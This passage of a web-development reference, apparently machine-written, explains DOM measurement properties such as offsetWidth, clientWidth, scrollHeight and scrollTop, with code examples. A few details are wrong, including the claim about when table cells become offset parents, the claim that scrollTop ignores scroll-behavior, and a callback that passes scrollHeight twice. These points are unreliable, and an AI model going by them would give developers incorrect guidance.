- Transformed dimensions (transforms don't affect offset dimensions)
- Box shadows
- Outlines

### Scrollbar Handling

Scrollbar inclusion depends on the rendering behavior:

- **Classic scrollbars** (Windows, Linux): Occupy layout space and are included in offset dimensions
- **Overlay scrollbars** (macOS, mobile): Float over content and typically don't affect offset dimensions
- The `scrollbar-gutter` CSS property can reserve space for scrollbars even when not visible

### Box-Sizing Interaction

The `box-sizing` property affects how content dimensions are calculated, which impacts the final offset values:

**box-sizing: content-box** (default):

- Width/height apply only to content
- offsetWidth = width + padding + border + scrollbar

**box-sizing: border-box**:

- Width/height include content + padding + border
- offsetWidth = width + scrollbar (if applicable)

### Hidden Elements

Elements with `display: none` return `0` for both properties because they generate no layout box. Elements with `visibility: hidden` maintain their layout box and return normal offset dimensions.

### Performance Characteristics

Reading `offsetWidth` or `offsetHeight` forces a **synchronous layout recalculation** (reflow) if:

- Styles have been modified since the last layout
- The DOM structure has changed
- Other layout-dependent properties have been queried

This can create performance bottlenecks when:

- Reading offset properties in loops
- Interleaving reads and writes to the DOM
- Frequently querying dimensions during animations

**[Inference]** Batching all dimensional reads together before performing writes minimizes forced reflows.

### Layout Thrashing Prevention

```javascript
// Poor performance - alternating reads/writes
elements.forEach(el => {
  const width = el.offsetWidth; // Forces layout
  el.style.width = width + 10 + 'px'; // Invalidates layout
  const height = el.offsetHeight; // Forces layout again
  el.style.height = height + 10 + 'px'; // Invalidates layout again
});

// Better - batch reads, then writes
const dimensions = elements.map(el => ({
  width: el.offsetWidth,
  height: el.offsetHeight
}));

elements.forEach((el, i) => {
  el.style.width = dimensions[i].width + 10 + 'px';
  el.style.height = dimensions[i].height + 10 + 'px';
});
```

### Sub-Pixel Precision

Since offset dimensions return integers, sub-pixel values are rounded. For precise measurements including fractional pixels, use:

- `getBoundingClientRect()`: Returns DOMRect with floating-point dimensions
- `element.getBoundingClientRect().width` and `.height` provide sub-pixel accuracy

### Transform and Offset Dimensions

CSS transforms (scale, rotate, skew) do **not** affect `offsetWidth` or `offsetHeight`. These properties report the pre-transform layout dimensions:

```javascript
element.style.transform = 'scale(2)';
console.log(element.offsetWidth); // Returns original width, not doubled
```

For transformed dimensions, use `getBoundingClientRect()` which accounts for transforms.

### Comparison with Other Dimensional Properties

|Property|Includes Padding|Includes Border|Includes Scrollbar|Precision|Includes Transforms|
|---|---|---|---|---|---|
|offsetWidth/Height|✓|✓|✓|Integer|✗|
|clientWidth/Height|✓|✗|✗|Integer|✗|
|scrollWidth/Height|✓|✗|✗|Integer|✗|
|getBoundingClientRect()|✓|✓|✓|Float|✓|

### Use Cases

**Appropriate uses:**

- Measuring element dimensions for layout calculations
- Determining if elements fit within containers
- Positioning absolutely positioned elements relative to offset parents
- Calculating available space for dynamic content

**Less appropriate uses:**

- High-frequency animation measurements (use getBoundingClientRect() with requestAnimationFrame)
- Sub-pixel precision requirements
- Measuring transformed element dimensions

### Cross-Browser Consistency

Modern browsers implement offset dimensions consistently according to the CSSOM View Module specification. Historical inconsistencies in IE6-7 regarding border calculations no longer apply to supported browsers.

### Relationship to Offset Parent

`offsetWidth` and `offsetHeight` measure the element's own dimensions and are independent of the `offsetParent` property. However, they're commonly used together:

- `offsetParent`: The nearest positioned ancestor (position: relative/absolute/fixed/sticky) or table elements
- `offsetLeft`/`offsetTop`: Position relative to offsetParent
- `offsetWidth`/`offsetHeight`: Element's own dimensions

### ResizeObserver Alternative

For scenarios requiring notification when offset dimensions change, `ResizeObserver` provides a more efficient alternative than polling:

```javascript
const observer = new ResizeObserver(entries => {
  entries.forEach(entry => {
    // entry.borderBoxSize provides dimension info
    // More efficient than repeatedly checking offsetWidth/Height
  });
});

observer.observe(element);
```

This avoids forcing synchronous layouts and provides optimized change detection.

---

## offsetLeft, offsetTop, offsetParent

### Core Mechanics

These properties provide element positioning relative to the **offset parent**, not the viewport or document. The offset parent is the nearest positioned ancestor (position: relative, absolute, fixed, or sticky) or the root element.

**offsetLeft** and **offsetTop** return the pixel distance from the element's border edge to its offset parent's padding edge. These are read-only integers that include:

- Distance accounting for the offset parent's padding but excluding the offset parent's border
- The element's own margin (the measurement starts from the element's border box)

**offsetParent** returns a reference to the positioning context element. Returns `null` when:

- The element or any ancestor has `display: none`
- The element has `position: fixed`
- The element is `<body>` or `<html>`

### Offset Parent Determination Algorithm

The browser traverses ancestors using this priority:

1. **Nearest positioned ancestor** (position: relative/absolute/sticky/fixed)
2. **`<td>`, `<th>`, `<table>`** (table elements are automatically offset parents)
3. **`<body>`** element as fallback

```javascript
// Example hierarchy
<div style="position: relative"> <!-- This becomes offset parent -->
  <div>
    <div id="target">Content</div>
  </div>
</div>

const target = document.getElementById('target');
console.log(target.offsetParent); // First positioned ancestor div
```

### Measurement Boundaries

**What's included in measurements:**

- Element's margin (offsetLeft/Top measure from border edge outward)
- Offset parent's padding (measurement goes to padding edge, not border)
- Cumulative positioning from transform origins [Inference: based on how browsers calculate layout]

**What's excluded:**

- Offset parent's border width
- Any transforms applied to ancestors (these don't affect offset values)
- Scroll positions (offsetLeft/Top are layout-based, not visual)

### Transform Interaction Behavior

[Unverified: Exact behavior varies by browser implementation]

CSS transforms create a **containing block** but the element may still report its untransformed offset parent:

```javascript
<div style="position: relative; transform: translateX(50px)">
  <div id="child">Test</div>
</div>

// child.offsetParent points to the transformed div
// child.offsetLeft reflects pre-transform layout position
// Visual position ≠ offset position when transforms exist
```

The offset properties reflect **layout position**, not the final rendered/transformed position. Use `getBoundingClientRect()` for actual visual coordinates.

### Fixed Positioning Edge Case

Elements with `position: fixed` always return `offsetParent === null` because:

- They're positioned relative to the viewport, not any DOM ancestor
- The viewport isn't represented as a DOM node that can be returned

```javascript
const fixed = document.querySelector('.fixed-element');
console.log(fixed.offsetParent); // null
console.log(fixed.offsetLeft);   // Distance from viewport left (effectively)
```

### Table Element Special Handling

Table cells (`<td>`, `<th>`) and the `<table>` element itself become offset parents **even without explicit positioning**:

```javascript
<table>
  <tr>
    <td style="position: relative">
      <div id="nested">Content</div>
    </td>
  </tr>
</table>

// nested.offsetParent is the <td>, not the <table>
// If td weren't positioned, offsetParent would be <table>
```

### Display: none Propagation

When `display: none` exists anywhere in the ancestor chain:

```javascript
element.offsetParent === null
element.offsetLeft === 0
element.offsetTop === 0
element.offsetWidth === 0
element.offsetHeight === 0
```

This applies even if the element itself is visible but an ancestor is hidden. The element effectively has no layout.

### Recursive Position Calculation

To calculate position relative to document:

```javascript
function getDocumentOffset(element) {
  let left = 0;
  let top = 0;
  
  while (element) {
    left += element.offsetLeft;
    top += element.offsetTop;
    element = element.offsetParent;
  }
  
  return { left, top };
}
```

[Inference: This approach accumulates offsets through the chain]

**Limitations of this approach:**

- Doesn't account for scroll positions of ancestors
- Ignores transforms on ancestors
- Assumes standard box model (content-box)
- May be incorrect with CSS columns or other complex layouts [Unverified]

### Comparison with getBoundingClientRect()

|Property|offsetLeft/Top|getBoundingClientRect()|
|---|---|---|
|Reference point|Offset parent's padding edge|Viewport|
|Includes transforms|No|Yes|
|Includes scroll|No|Yes (viewport-relative)|
|Return type|Integer|DOMRect (floating point)|
|Fractional pixels|Rounded|Precise|
|Performance|Faster [Inference]|Slower (forces layout)|

### Border-Box Model Interaction

With `box-sizing: border-box`, measurements still start from the **border edge**:

```javascript
<div id="parent" style="position: relative; padding: 10px">
  <div id="child" style="margin: 5px; box-sizing: border-box">
</div>

// child.offsetLeft === 15 (parent padding 10px + child margin 5px)
// Border-box doesn't change offset measurement origin
```

### Inline Elements

Inline elements (non-replaced) report offset properties based on their first rendered box:

```javascript
<div style="position: relative">
  <span id="inline">Text that wraps
    across multiple lines</span>
</div>

// inline.offsetLeft/offsetTop refers to the first line box
// Multi-line spans have only one offset reference point
```

For complete bounding information of inline elements, use `getClientRects()` which returns a rectangle for each line box.

### Performance Considerations

[Inference: Based on typical browser rendering pipeline behavior]

Reading offset properties **forces layout recalculation** (reflow) if:

- DOM structure has changed since last layout
- CSS has been modified
- Other layout-affecting properties were read

**Optimization patterns:**

```javascript
// Bad: Causes multiple reflows
for (let el of elements) {
  el.style.left = el.offsetLeft + 10 + 'px'; // Read-write interleaving
}

// Better: Batch reads, then writes
const positions = elements.map(el => el.offsetLeft);
elements.forEach((el, i) => {
  el.style.left = positions[i] + 10 + 'px';
});
```

### ScrollLeft/ScrollTop Relationship

Offset properties are independent of scroll state:

```javascript
<div id="container" style="position: relative; overflow: scroll">
  <div id="content" style="height: 2000px">
    <div id="target" style="margin-top: 500px">
  </div>
</div>

// target.offsetTop === 500 (layout position, unchanged by scrolling)
// To get visible position: offsetTop - container.scrollTop
```

Calculate viewport-visible position: `element.offsetTop - element.offsetParent.scrollTop`

### Sticky Positioning Behavior

[Unverified: Browser implementation details may vary]

`position: sticky` elements become offset parents, but their offsetLeft/Top reflects their **normal flow position**, not their "stuck" visual position:

```javascript
<div style="position: sticky; top: 0">
  <div id="child">Content</div>
</div>

// child.offsetParent is the sticky div
// child.offsetTop reflects layout position, not scroll-adjusted stuck position
```

Sticky elements report pre-stick offsets. Use `getBoundingClientRect()` for actual stuck position.

### Subpixel Rendering

Offset properties return **rounded integers**, discarding subpixel precision:

```javascript
// Element actually at 10.7px from offset parent
element.offsetLeft === 11 // Rounded

// For precision, use:
element.getBoundingClientRect().left - 
  element.offsetParent.getBoundingClientRect().left
```

[Inference: Rounding behavior likely rounds to nearest integer, but exact rounding rules are implementation-specific]

### CSS Writing Modes

[Unverified: Behavior in non-horizontal-tb writing modes]

In vertical writing modes (`writing-mode: vertical-rl`), offsetLeft/offsetTop still use physical directions (not logical start/end):

- offsetLeft: physical left edge distance
- offsetTop: physical top edge distance

These don't automatically flip to match logical flow direction. For writing-mode-aware positioning, calculate based on element.getBoundingClientRect() and compare with parent coordinates.

### Shadow DOM Boundaries

[Unverified: Specific shadow DOM behavior may depend on browser]

Offset parent relationships **cross shadow boundaries**:

```javascript
// Light DOM
<div id="host" style="position: relative">
  #shadow-root
    <div id="shadow-child">Content</div>
</div>

// shadow-child.offsetParent can reference light DOM ancestor (#host)
```

Shadow DOM doesn't create an automatic offset parent boundary unless the shadow host itself is positioned.

---

## clientWidth and clientHeight

### Definition and Core Behavior

`clientWidth` and `clientHeight` are read-only properties that return the inner dimensions of an element in pixels, including padding but excluding borders, margins, and scrollbars.

```javascript
const width = element.clientWidth;
const height = element.clientHeight;
```

The calculation follows this formula:

- **clientWidth** = content width + left padding + right padding (minus vertical scrollbar width if present)
- **clientHeight** = content height + top padding + bottom padding (minus horizontal scrollbar height if present)

### Return Value Characteristics

Both properties return values as integers, rounded to the nearest whole number. For sub-pixel precision requirements, use `getBoundingClientRect()` instead.

When an element has no CSS layout boxes (such as inline elements or elements with `display: none`), both properties return `0`.

### Scrollbar Handling

The most distinctive aspect of these properties is scrollbar treatment. When an element has scrollbars:

```javascript
// Element with scrollbar
const contentArea = element.clientWidth; // Excludes scrollbar width
const totalWidth = element.offsetWidth;   // Includes scrollbar width
```

On most systems, the standard scrollbar width is approximately 15-17 pixels, though this varies by:

- Operating system
- Browser
- User accessibility settings
- Custom scrollbar styling

For overlay scrollbars (common on macOS and mobile devices), `clientWidth` and `clientHeight` include the full content area since scrollbars don't occupy layout space.

### Document-Level Usage

For the root `<html>` element, these properties have special behavior:

```javascript
// Viewport dimensions (excluding scrollbars)
const viewportWidth = document.documentElement.clientWidth;
const viewportHeight = document.documentElement.clientHeight;
```

This differs from `window.innerWidth` and `window.innerHeight`, which include scrollbar dimensions:

```javascript
// Includes scrollbars
const windowWidth = window.innerWidth;
const windowHeight = window.innerHeight;

// Excludes scrollbars
const viewportWidth = document.documentElement.clientWidth;
const viewportHeight = document.documentElement.clientHeight;
```

### Box Model Interaction

Understanding how `clientWidth` and `clientHeight` fit within the CSS box model:

```css
.element {
  width: 200px;
  height: 150px;
  padding: 20px;
  border: 5px solid black;
  margin: 10px;
}
```

```javascript
// With the above CSS:
element.clientWidth;  // 240 (200 + 20 + 20)
element.clientHeight; // 190 (150 + 20 + 20)
element.offsetWidth;  // 250 (240 + 5 + 5)
element.offsetHeight; // 200 (190 + 5 + 5)
```

For `box-sizing: border-box`:

```css
.element {
  box-sizing: border-box;
  width: 200px;
  height: 150px;
  padding: 20px;
  border: 5px solid black;
}
```

```javascript
// Content area shrinks to accommodate padding within total width/height
element.clientWidth;  // 190 (200 - 5 - 5, then includes padding)
element.clientHeight; // 140 (150 - 5 - 5, then includes padding)
```

### Practical Applications

#### Responsive Layout Calculations

```javascript
function adjustLayout(container) {
  const availableWidth = container.clientWidth;
  const itemWidth = 250;
  const gap = 20;
  
  const itemsPerRow = Math.floor(
    (availableWidth + gap) / (itemWidth + gap)
  );
  
  return itemsPerRow;
}
```

#### Scroll Detection Setup

```javascript
function hasVerticalScrollbar(element) {
  return element.scrollHeight > element.clientHeight;
}

function hasHorizontalScrollbar(element) {
  return element.scrollWidth > element.clientWidth;
}
```

#### Viewport-Relative Positioning

```javascript
function centerElement(element) {
  const viewportWidth = document.documentElement.clientWidth;
  const viewportHeight = document.documentElement.clientHeight;
  
  const elementWidth = element.offsetWidth;
  const elementHeight = element.offsetHeight;
  
  element.style.left = `${(viewportWidth - elementWidth) / 2}px`;
  element.style.top = `${(viewportHeight - elementHeight) / 2}px`;
}
```

#### Dynamic Content Sizing

```javascript
function fitContentToContainer(container, content) {
  const containerWidth = container.clientWidth;
  const containerHeight = container.clientHeight;
  
  const scale = Math.min(
    containerWidth / content.offsetWidth,
    containerHeight / content.offsetHeight
  );
  
  content.style.transform = `scale(${scale})`;
}
```

### Performance Considerations

Reading `clientWidth` and `clientHeight` can trigger layout reflows if the browser's layout information is stale. To optimize:

```javascript
// Inefficient: Multiple reflows
elements.forEach(el => {
  el.style.width = `${el.clientWidth * 1.5}px`; // Read then write
});

// Efficient: Batch reads, then batch writes
const widths = elements.map(el => el.clientWidth); // All reads
elements.forEach((el, i) => {
  el.style.width = `${widths[i] * 1.5}px`; // All writes
});
```

Using `ResizeObserver` for dimension monitoring avoids manual polling:

```javascript
const observer = new ResizeObserver(entries => {
  for (const entry of entries) {
    const { inlineSize, blockSize } = entry.contentBoxSize[0];
    // inlineSize and blockSize correspond to width and height
    // in the element's writing mode
  }
});

observer.observe(element);
```

### Edge Cases and Special Scenarios

#### Inline Elements

Inline elements without layout boxes return `0`:

```javascript
const span = document.querySelector('span');
console.log(span.clientWidth); // 0

// Make it a block-level element
span.style.display = 'inline-block';
console.log(span.clientWidth); // Actual width
```

#### Hidden Elements

Elements with `display: none` or ancestors with `display: none`:

```javascript
element.style.display = 'none';
console.log(element.clientWidth); // 0
console.log(element.clientHeight); // 0
```

For `visibility: hidden`, dimensions are preserved:

```javascript
element.style.visibility = 'hidden';
console.log(element.clientWidth); // Actual width (not 0)
```

#### SVG Elements

SVG elements don't support `clientWidth` and `clientHeight` in the same way. Use `getBoundingClientRect()` or `getBBox()` instead:

```javascript
const svg = document.querySelector('svg');
const rect = svg.getBoundingClientRect();
console.log(rect.width, rect.height);
```

#### Table Elements

For table cells, `clientWidth` and `clientHeight` include padding but behavior with borders depends on `border-collapse`:

```css
table {
  border-collapse: collapse; /* or separate */
}
```

With `border-collapse: collapse`, cell borders overlap and dimension calculations become complex. [Inference] The exact treatment may vary by browser implementation.

### Relationship to Other Dimension Properties

#### offsetWidth and offsetHeight

Include borders and scrollbars:

```javascript
// Comparison
element.clientWidth;  // Padding + content (- scrollbar)
element.offsetWidth;  // Padding + content + borders (+ scrollbar)
```

#### scrollWidth and scrollHeight

Represent the total scrollable content dimensions:

```javascript
const container = document.querySelector('.scrollable');
const hasOverflow = container.scrollWidth > container.clientWidth;

if (hasOverflow) {
  const hiddenWidth = container.scrollWidth - container.clientWidth;
  console.log(`${hiddenWidth}px of content is scrolled out of view`);
}
```

#### getBoundingClientRect()

Provides sub-pixel precision and position information:

```javascript
const rect = element.getBoundingClientRect();
// rect.width may differ slightly from clientWidth due to:
// - Sub-pixel precision
// - CSS transforms
// - Border inclusion in rect but not clientWidth
```

### Cross-Browser Consistency

Modern browsers (Chrome, Firefox, Safari, Edge) implement these properties consistently according to the CSSOM View Module specification. Historical inconsistencies in IE6-8 are no longer relevant for current development.

One remaining consideration is scrollbar width variation across platforms, which affects calculations when precision is required:

```javascript
function getScrollbarWidth() {
  const outer = document.createElement('div');
  outer.style.visibility = 'hidden';
  outer.style.overflow = 'scroll';
  outer.style.width = '100px';
  document.body.appendChild(outer);
  
  const inner = document.createElement('div');
  inner.style.width = '100%';
  outer.appendChild(inner);
  
  const scrollbarWidth = outer.offsetWidth - inner.offsetWidth;
  document.body.removeChild(outer);
  
  return scrollbarWidth;
}
```

### Writing Mode Considerations

In non-horizontal writing modes (e.g., `writing-mode: vertical-rl`), `clientWidth` and `clientHeight` still refer to the physical horizontal and vertical dimensions, not logical inline/block dimensions:

```css
.vertical {
  writing-mode: vertical-rl;
  width: 200px;
  height: 400px;
  padding: 20px;
}
```

```javascript
// Physical dimensions remain unchanged
element.clientWidth;  // 240 (200 + 20 + 20)
element.clientHeight; // 440 (400 + 20 + 20)
```

For logical dimension queries, use the Resize Observer API's `contentBoxSize` which provides `inlineSize` and `blockSize`.

---

## clientLeft and clientTop

### Definition and Purpose

`clientLeft` and `clientTop` are read-only properties that return the width of the left border and top border of an element, respectively, measured in pixels. These properties specifically measure the distance between the outside edge of an element and the inside edge (where the client area begins).

### Border Width Measurement

**clientLeft** returns the width of the left border in pixels. In left-to-right layouts, this is simply the left border width. In right-to-left (RTL) layouts where a vertical scrollbar appears on the left side, `clientLeft` includes both the left border width and the scrollbar width.

**clientTop** returns the width of the top border in pixels. Unlike `clientLeft`, this property is not affected by text direction or scrollbar positioning.

### Return Values and Data Types

Both properties return integer values representing pixels. If no border exists, they return `0`. The values are always non-negative integers, as borders cannot have negative dimensions.

### Relationship to CSS Box Model

These properties measure only the border portions of the CSS box model. They do not include:

- Padding
- Content area
- Margin
- Scrollbar width (except for `clientLeft` in RTL layouts with left-side scrollbars)

### Scrollbar Considerations

**Standard (LTR) layouts:** Scrollbars typically appear on the right side and do not affect `clientLeft` or `clientTop`.

**RTL layouts:** When `direction: rtl` is set and a vertical scrollbar is present, some browsers render the scrollbar on the left side. In these cases, `clientLeft` includes both the left border width and the scrollbar width.

**Horizontal scrollbars:** Bottom-positioned horizontal scrollbars do not affect `clientTop`.

### Practical Use Cases

**Coordinate calculations:** When converting between different coordinate systems (page coordinates, client coordinates, offset coordinates), `clientLeft` and `clientTop` help account for border widths.

**Precise element positioning:** For pixel-perfect positioning of child elements or overlays relative to a bordered container, these properties provide the exact border dimensions.

**Custom scrollbar implementations:** When building custom scrolling behavior, `clientLeft` helps determine the actual content start position.

**Drawing and canvas operations:** When overlaying canvas elements or drawing on top of bordered containers, these properties ensure accurate alignment.

### Browser Compatibility

Both properties are widely supported across all modern browsers including Chrome, Firefox, Safari, Edge, and Internet Explorer. They have been part of the CSSOM View Module specification and enjoy universal support.

### Performance Characteristics

Reading `clientLeft` and `clientTop` does not trigger layout recalculation (reflow) in most modern browsers, as these values are typically cached. However, if the properties are accessed after DOM modifications that invalidate layout, the browser may need to recalculate styles and layout before returning the values.

### Comparison with Related Properties

**clientWidth/clientHeight:** Measure the inner dimensions including padding but excluding borders and scrollbars. `clientLeft` and `clientTop` measure only border widths.

**offsetLeft/offsetTop:** Measure the position of an element relative to its offset parent, including all positioning contexts. These are positional properties, not dimensional ones.

**getBoundingClientRect():** Returns an object with dimensions and positions including borders, providing a more comprehensive measurement that encompasses what `clientLeft` and `clientTop` partially describe.

**scrollLeft/scrollTop:** Measure scroll position, not border dimensions.

**getComputedStyle():** Can retrieve `borderLeftWidth` and `borderTopWidth` as strings with units (e.g., "5px"), while `clientLeft` and `clientTop` return numeric pixel values.

### Edge Cases and Quirks

**Fractional borders:** When CSS specifies fractional border widths (e.g., `1.5px`), `clientLeft` and `clientTop` return rounded integer values. [Inference: Rounding behavior may vary by browser implementation].

**Transform and scale:** CSS transforms do not affect `clientLeft` and `clientTop` values, as these properties measure the original border dimensions in the document flow.

**Display: none elements:** Elements with `display: none` return `0` for both properties since they are not rendered and have no border dimensions.

**Table elements:** For table cells, `clientLeft` and `clientTop` behavior can vary based on `border-collapse` settings. [Inference: Collapsed borders may affect measurements differently across implementations].

### Code Examples

```javascript
const element = document.getElementById('myElement');

// Get border widths
const leftBorderWidth = element.clientLeft;
const topBorderWidth = element.clientTop;

// Calculate inner content start position relative to element's outer edge
const contentStartX = element.clientLeft;
const contentStartY = element.clientTop;

// Account for borders when positioning
const rect = element.getBoundingClientRect();
const innerLeft = rect.left + element.clientLeft;
const innerTop = rect.top + element.clientTop;
```

### Interaction with CSS Properties

**border-style:** Only when a border style is set (solid, dashed, double, etc.) do `clientLeft` and `clientTop` return non-zero values.

**border-width:** The values returned directly correspond to the computed border widths.

**box-sizing:** This property does not affect `clientLeft` and `clientTop` since they measure only borders, regardless of how the total element size is calculated.

**outline:** Outlines are drawn outside the border box and do not affect these properties.

---

## scrollWidth and scrollHeight

### Core Mechanics

`scrollWidth` and `scrollHeight` are read-only properties that return the **total content dimensions** of an element, including content that overflows and is not visible within the element's scrollable area. These measurements include padding but exclude borders, margins, and scrollbars.

The key distinction: while `clientWidth`/`clientHeight` measure the visible viewport of an element, `scrollWidth`/`scrollHeight` measure the entire scrollable content area, regardless of whether it's currently visible.

### Precise Calculation Rules

**scrollWidth** = max(content width + padding, clientWidth) **scrollHeight** = max(content height + padding, clientHeight)

When content doesn't overflow, `scrollWidth` equals `clientWidth` and `scrollHeight` equals `clientHeight`. When overflow occurs, these scroll properties reflect the actual space needed to display all content.

### Padding Inclusion Behavior

Both properties include the element's padding on all sides. If an element has `padding: 20px` and content that's 300px wide, the `scrollWidth` will be at least 340px (300 + 20 + 20). This is consistent regardless of whether overflow is occurring.

Critical detail: padding is measured even in the overflow region. If content overflows to the right, the right padding is still included in `scrollWidth`, even though it may not be visually apparent.

### Overflow Direction Impact

The directionality of overflow affects interpretation but not calculation:

- **Horizontal overflow**: `scrollWidth` exceeds `clientWidth`
- **Vertical overflow**: `scrollHeight` exceeds `clientHeight`
- **Both directions**: Both scroll properties exceed their client counterparts

For RTL (right-to-left) layouts, `scrollWidth` calculation remains the same, but scrolling behavior and `scrollLeft` values behave differently.

### Box-Sizing Interaction

The `box-sizing` property doesn't directly affect `scrollWidth`/`scrollHeight` calculations—these always measure content + padding regardless of the box model. However, `box-sizing` affects how width/height declarations are interpreted, which indirectly impacts what overflows:

```javascript
// box-sizing: content-box (default)
// width: 200px means content area is 200px
// padding adds to this for layout purposes

// box-sizing: border-box
// width: 200px includes padding in the 200px
// content area is reduced by padding
```

### Fractional Pixels and Rounding

Modern browsers calculate these properties with sub-pixel precision internally, but the returned values are **rounded to integers**. The rounding behavior:

- Chrome/Edge: Round to nearest integer
- Firefox: Round to nearest integer
- Safari: Round to nearest integer

This can cause discrepancies when detecting whether content has overflowed by comparing scroll dimensions to client dimensions—a difference of less than 1 pixel might round away.

### Transform and Position Effects

**Transforms do not affect scrollWidth/scrollHeight**. An element scaled with `transform: scale(2)` will still report its pre-transform dimensions. This is because transforms are applied during the paint phase, after layout calculations.

**Absolute positioning** of children can affect parent scroll dimensions:

- Absolutely positioned children are removed from normal flow
- They extend parent's scroll dimensions if they overflow
- `position: absolute` with negative offsets can create interesting scenarios where content extends beyond normal bounds

```javascript
// Parent with position: relative, overflow: auto
// Child with position: absolute; left: -100px
// Parent's scrollWidth includes this negative-offset content
```

### Pseudo-elements and Generated Content

Content from `::before` and `::after` pseudo-elements **is included** in scroll dimension calculations. This includes:

- Text content from `content` property
- Generated boxes with width/height
- Padding/margins on pseudo-elements

### Detecting Overflow Programmatically

The canonical overflow detection pattern:

```javascript
const hasHorizontalOverflow = element.scrollWidth > element.clientWidth;
const hasVerticalOverflow = element.scrollHeight > element.clientHeight;
```

However, account for sub-pixel rounding with tolerance:

```javascript
const hasOverflow = (element.scrollHeight - element.clientHeight) > 1;
```

### Performance Characteristics

Reading `scrollWidth`/`scrollHeight` forces a **layout reflow** if any DOM changes have occurred since the last layout. This is because the browser must calculate layout to determine content dimensions.

Performance implications:

- Batch reads together, separate from writes
- Cache values when content is static
- Avoid reading in tight loops or during animations
- Use ResizeObserver for monitoring changes instead of polling

### Inline Elements Behavior

For inline elements (non-replaced), `scrollWidth` and `scrollHeight` return 0 in most browsers, as inline elements don't establish a scrolling context. To measure inline content:

- Wrap in a block container
- Use `getBoundingClientRect()` instead
- Change display to `inline-block` temporarily

### Table Elements Specifics

Tables have unique scroll dimension behavior:

- `scrollWidth` on table includes all columns, even those scrolled out of view
- Cell padding contributes to dimensions
- `border-collapse: collapse` affects whether border spacing is included
- Table wrapper divs are often necessary for controlled scrolling

### Zoom and Scaling Considerations

Browser zoom affects scroll dimensions proportionally:

- At 200% zoom, dimensions are doubled
- CSS zoom property also affects measurements
- `transform: scale()` does NOT affect (as mentioned earlier)

### Cross-browser Quirks

**Firefox**: Historically had issues with scroll dimensions in certain flexbox scenarios, largely resolved in recent versions.

**Safari**: May report slightly different values for elements with complex nested scrolling, particularly with `-webkit-overflow-scrolling: touch`.

**IE11** (legacy): Had numerous bugs including incorrect calculations with box-sizing and padding, and issues with absolutely positioned children.

### Relationship to Scroll Position

These properties work in conjunction with `scrollLeft` and `scrollTop`:

```javascript
// Maximum scroll position
const maxScrollLeft = element.scrollWidth - element.clientWidth;
const maxScrollTop = element.scrollHeight - element.clientHeight;

// Detect if scrolled to bottom
const isAtBottom = 
  Math.abs(element.scrollHeight - element.clientHeight - element.scrollTop) < 1;
```

### Writing Mode Sensitivity

In vertical writing modes (`writing-mode: vertical-rl` or `vertical-lr`):

- `scrollWidth` still measures horizontal dimension
- `scrollHeight` still measures vertical dimension
- But the "main axis" of content flow has changed
- Logical properties (`block-size`, `inline-size`) may be clearer in these contexts

### Dynamic Content Scenarios

When content changes dynamically:

```javascript
// After adding content
element.innerHTML += newContent;
// scrollHeight updates automatically on next read
console.log(element.scrollHeight); // Triggers reflow, returns new value

// But if you're animating, wait for rendering
requestAnimationFrame(() => {
  console.log(element.scrollHeight); // More reliable
});
```

### Use Cases and Patterns

**Auto-scrolling to bottom** (chat interfaces):

```javascript
element.scrollTop = element.scrollHeight;
```

**Detecting if element needs scrollbars**:

```javascript
const needsScroll = element.scrollHeight > element.clientHeight;
```

**Calculating scroll percentage**:

```javascript
const scrollPercentage = 
  element.scrollTop / (element.scrollHeight - element.clientHeight) * 100;
```

**Infinite scroll triggers**:

```javascript
const bottomThreshold = 100; // pixels from bottom
const distanceFromBottom = 
  element.scrollHeight - element.clientHeight - element.scrollTop;
if (distanceFromBottom < bottomThreshold) {
  loadMoreContent();
}
```

### Mutation Observer Integration

For monitoring dimension changes efficiently:

```javascript
const resizeObserver = new ResizeObserver(entries => {
  for (let entry of entries) {
    const target = entry.target;
    // scrollHeight/scrollWidth are now updated
    handleDimensionChange(target.scrollHeight, target.scrollHeight);
  }
});

resizeObserver.observe(element);
```

This avoids polling and forced reflows from repeatedly reading scroll dimensions.

---

## scrollLeft and scrollTop

### Properties Overview

`scrollLeft` and `scrollTop` are properties of the `Element` interface that represent the number of pixels an element's content is scrolled from its left edge and top edge, respectively. These properties are both readable and writable, allowing you to query the current scroll position or programmatically set it.

### Value Characteristics

**Data Type and Range**

- Both properties return and accept `Number` values (double-precision floating-point)
- Values represent pixels as integers in most implementations
- `scrollLeft` range: `0` to `(scrollWidth - clientWidth)`
- `scrollTop` range: `0` to `(scrollHeight - clientHeight)`
- Negative values are automatically clamped to `0`
- Values exceeding maximum scroll are clamped to the maximum

**Precision and Subpixel Scrolling**

- Modern browsers support subpixel scrolling, returning fractional pixel values
- Values may be non-integer when using zoom, CSS transforms, or on high-DPI displays
- Reading may return fractional values even after setting integer values

### Reading Scroll Position

```javascript
const element = document.getElementById('scrollable');
const horizontalScroll = element.scrollLeft;
const verticalScroll = element.scrollTop;

// Check if scrolled to bottom
const isAtBottom = element.scrollTop + element.clientHeight >= element.scrollHeight;

// Check if scrolled to right edge
const isAtRightEdge = element.scrollLeft + element.clientWidth >= element.scrollWidth;
```

### Setting Scroll Position

**Direct Assignment**

```javascript
element.scrollLeft = 100;
element.scrollTop = 500;

// Scroll to top-left
element.scrollLeft = 0;
element.scrollTop = 0;

// Scroll to bottom
element.scrollTop = element.scrollHeight - element.clientHeight;
```

**Behavior Characteristics**

- Setting these properties causes immediate, non-smooth scrolling (jumps to position)
- Does not trigger smooth scrolling even if `scroll-behavior: smooth` is applied via CSS
- Setting either property will fire a `scroll` event
- Multiple rapid assignments may be batched by the browser

### RTL (Right-to-Left) Handling

**Browser Inconsistencies** The behavior of `scrollLeft` in RTL contexts varies significantly across browsers:

**Firefox and Chrome (Negative Values)**

- Initial scroll position (fully scrolled right): negative value
- Scrolling left increases the value toward `0`
- Range: `-(scrollWidth - clientWidth)` to `0`

**Safari and Edge Legacy (Positive Values)**

- Initial position: `0`
- Scrolling left increases value
- Range: `0` to `(scrollWidth - clientWidth)`

**Internet Explorer (Positive, Reversed)**

- Initial position: `scrollWidth - clientWidth`
- Scrolling left decreases value toward `0`

**[Inference]** Detection pattern:

```javascript
function detectRTLScrollType() {
  const div = document.createElement('div');
  div.dir = 'rtl';
  div.style.cssText = 'width: 1px; height: 1px; overflow: scroll; position: absolute; top: -9999px';
  div.innerHTML = '<div style="width: 2px; height: 1px;"></div>';
  document.body.appendChild(div);
  
  const initial = div.scrollLeft;
  div.scrollLeft = 1;
  const changed = div.scrollLeft;
  
  document.body.removeChild(div);
  
  if (initial === 0 && changed > 0) return 'positive-increasing';
  if (initial < 0) return 'negative';
  return 'positive-decreasing';
}
```

### Relationship with Other Scroll Properties

**scrollWidth and scrollHeight**

